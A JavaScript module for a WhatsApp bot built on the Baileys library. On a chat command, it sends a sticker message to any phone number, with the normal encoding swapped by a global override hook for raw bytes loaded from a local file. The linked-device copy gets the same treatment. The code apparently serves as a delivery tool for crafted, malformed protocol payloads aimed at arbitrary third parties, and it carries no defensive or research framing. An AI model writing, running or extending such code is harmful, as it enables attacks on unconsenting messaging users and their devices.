import fs from 'node:fs'
import { generateMessageIDV2 } from '@whiskeysockets/baileys'

const MARK = '__RAWREPLAY__'

const varint = (n) => {
  const o = []
  while (n > 127) { o.push((n & 127) | 128); n = Math.floor(n / 128) }
  o.push(n)
  return Buffer.from(o)
}
const ld = (field, buf) => Buffer.concat([varint(field * 8 + 2), varint(buf.length), buf])

const normalize = (s) => {
  const raw = String(s || '').replace(/\D/g, '')
  return raw.startsWith('0') ? '62' + raw.slice(1) : raw
}

export function installReplay(sock, { isAllowedJids, msgStore, defaultNumber }) {
  let RAW = null

  globalThis.__rawOverride = (m) => {
    if (RAW) {
      console.log(
        '[ENC] keys:', Object.keys(m || {}),
        '| sticker.directPath:', m?.stickerMessage?.directPath,
        '| deviceSent.inner:', m?.deviceSentMessage?.message
          ? Object.keys(m.deviceSentMessage.message)
          : '-'
      )
    }
    if (!RAW) return null

    if (m?.stickerMessage?.directPath === MARK) {
      console.log('[OVERRIDE] Using raw bytes for recipient:', RAW.length)
      return RAW
    }
    const d = m?.deviceSentMessage
    if (d?.message?.stickerMessage?.directPath === MARK) {
      console.log('[OVERRIDE] Using raw bytes for linked device copy')
      return ld(31, Buffer.concat([
        ld(1, Buffer.from(d.destinationJid || '')),
        ld(2, RAW),
      ]))
    }
    return null
  }

  sock.ev.on('messages.upsert', async ({ messages }) => {
    for (const msg of messages) {
      const key = msg.key
      const jids = [key.remoteJid, key.remoteJidAlt, key.participant, key.participantAlt]
      if (!isAllowedJids(jids)) continue

      const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || ''
      const [cmd, arg] = text.trim().split(/\s+/)
      if (cmd !== '!tes' && cmd !== '!replay') continue

      try {
        const num = normalize(arg) || defaultNumber
        const [info] = (await sock.onWhatsApp(num)) || []
        if (!info?.exists) {
          console.log('[CMD] Number is not registered on WhatsApp:', num)
          continue
        }
        const target = info.jid

        if (cmd === '!tes') {
          const res = await sock.sendMessage(target, { text: 'A quick test from the bot.' })
          if (res?.key?.id && res.message) msgStore.set(res.key.id, res.message)
          console.log('[TEST] Sent to', target)
          continue
        }

        RAW = fs.readFileSync('bin/inner.bin')
        console.log('[REPLAY] Sending', RAW.length, 'bytes to', target)

        const message = { stickerMessage: { mimetype: 'image/webp', directPath: MARK } }
        const messageId = generateMessageIDV2(sock.user?.id)
        msgStore.set(messageId, message)
        await sock.relayMessage(target, message, { messageId })
        console.log('[REPLAY] Sent | id:', messageId)
      } catch (e) {
        console.error('[CMD] Failed:', e)
      }
    }
  })
}
